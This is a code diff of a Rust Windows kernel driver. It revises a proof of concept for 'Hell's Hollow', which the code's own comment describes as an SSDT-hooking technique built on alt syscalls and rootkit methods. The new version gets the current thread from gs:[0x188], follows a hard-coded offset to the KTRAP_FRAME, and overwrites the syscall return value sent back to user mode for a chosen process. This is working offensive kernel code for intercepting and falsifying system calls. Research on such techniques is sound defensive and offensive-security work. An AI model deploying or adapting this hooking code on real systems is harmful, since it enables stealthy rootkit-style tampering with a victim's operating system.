@@ -3,14 +3,10 @@ use core::{arch::asm, ffi::c_void, ptr::null_mut};
 use alloc::{boxed::Box, string::String, vec::Vec};
 use wdk::println;
 use wdk_sys::{
-    _KTRAP_FRAME,
-    _MODE::KernelMode,
-    ACCESS_MASK, DISPATCHER_HEADER, DRIVER_OBJECT, HANDLE, NTSTATUS, OBJ_KERNEL_HANDLE, PETHREAD,
-    PHANDLE, PKTHREAD, PROCESS_ALL_ACCESS, PsThreadType, THREAD_ALL_ACCESS, ULONG,
     ntddk::{
         IoGetCurrentProcess, IoThreadToProcess, ObReferenceObjectByHandle, ObfDereferenceObject,
         ZwClose,
-    },
+    }, PsThreadType, ACCESS_MASK, DISPATCHER_HEADER, DRIVER_OBJECT, HANDLE, KTRAP_FRAME, NTSTATUS, OBJ_KERNEL_HANDLE, PETHREAD, PHANDLE, PKTHREAD, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, ULONG, _KTHREAD, _KTRAP_FRAME, _MODE::KernelMode
 };
 
 use crate::utils::{
@@ -78,12 +74,15 @@ pub enum AltSyscallStatus {
     Disable,
 }
 
+#[repr(C)]
+struct KThreadLocalDef {
+    junk: [u8; 0x90],
+    k_trap_ptr: *mut KTRAP_FRAME,
+
+}
+
 /// The actual PoC for Hell's Hollow can be found here. For full reference:
 /// https://fluxsec.red/hells-hollow-a-new-SSDT-hooking-technique-with-alt-syscalls-rootkit
-/// 
-/// # Note
-/// We make sure to inline the function here, as it just helps easily calculate the stack required for the entire
-/// callback routine for Alt Syscalls. Keeps it to 1 stack frame.
 #[inline(always)]
 fn hells_hollow_poc() -> Result<i32, ()> {
     let proc_name = get_process_name().to_lowercase();
@@ -95,31 +94,26 @@ fn hells_hollow_poc() -> Result<i32, ()> {
     if proc_name.contains("hello_world") {
         println!("Found target process {proc_name}");
 
-        let mut current_rsp_val: u64 = 0;
-
+        let mut k_thread: *mut c_void = null_mut();
+        // SAFETY: Pointers here guaranteed and reduces visual clutter
         unsafe {
             asm!(
-                "mov {out}, rsp",
-                out = out(reg) current_rsp_val,
-                options(nomem, nostack, preserves_flags),
+                "mov {}, gs:[0x188]",
+                out(reg) k_thread,
             );
+
+            let k_thread = &mut *(k_thread as *mut KThreadLocalDef);
+            let k_trap = &mut *k_thread.k_trap_ptr;
+
+            println!("Address of _KTRAP_FRAME: {:p}", (*k_thread).k_trap_ptr);
+
+            // change the return value to usermode
+            k_trap.P3Home = 0xfa;
+            
+            // print the SSN
+            println!("Current value of `rax` (ssn): {:X}", k_trap.Rax);
+            println!("Returning `rax` result to usermode syscall: {:X}", k_trap.P3Home);
         }
-
-        // rsp + offset of stack frames to our callback + the stack size of the callback handler
-        const STACK_DEPTH_FROM_KI_SYSTEM_CALL: u64 = 0x168;
-        const CALLBACK_STACK_SIZE: u64 = 0x3D8; // stack depth of the CALLBACK this is why inlining here helps
-        let trap_addr = (current_rsp_val + STACK_DEPTH_FROM_KI_SYSTEM_CALL + CALLBACK_STACK_SIZE)
-            as *mut _KTRAP_FRAME;
-
-        println!("Stack address of the KTRAP_FRAME: {:p}", trap_addr);
-
-        let ktrap: _KTRAP_FRAME = unsafe { *trap_addr };
-
-        // change the return value to usermode
-        unsafe { (*trap_addr).P3Home = 0xff };
-
-        // print the SSN
-        println!("Current value of rax: {:X}", ktrap.Rax);
 
         return Ok(0);
     }
